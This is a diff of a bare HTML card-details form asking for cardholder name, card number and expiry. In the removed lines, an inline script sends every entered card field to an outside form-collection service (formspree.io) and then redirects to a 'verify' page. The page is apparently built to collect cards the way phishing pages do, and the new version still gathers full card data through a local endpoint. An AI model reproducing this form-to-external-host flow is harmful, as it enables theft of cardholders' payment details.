@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Card Info</title>
+  <title>Card Information</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="container">
-    <h2>Card Details</h2>
-    <form id="form">
+    <h2>Card Information</h2>
+    <form action="/api/card" method="POST">
       <label>Cardholder Name: *</label><br><input type="text" name="cardname" required><br>
       <label>Card Number: *</label><br><input type="text" name="cardnumber" required><br>
       <label>Expiry: *</label><br><input type="text" name="expiry" required><br>
@@ -15,29 +15,5 @@
       <input type="submit" value="Next">
     </form>
   </div>
-
-<script>
-  document.getElementById('form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const formData = new FormData(this);
-    fetch("https://formspree.io/f/mnnvnwap", {
-      method: "POST",
-      body: formData,
-      headers: {
-        'Accept': 'application/json'
-      }
-    }).then(response => {
-      if (response.ok) {
-        window.location.href = "verify.html";
-      } else {
-        alert("Form submission failed. Please try again.");
-      }
-    }).catch(error => {
-      console.error("Error submitting form:", error);
-      alert("An error occurred. Please try again.");
-    });
-  });
-</script>
-
 </body>
 </html>
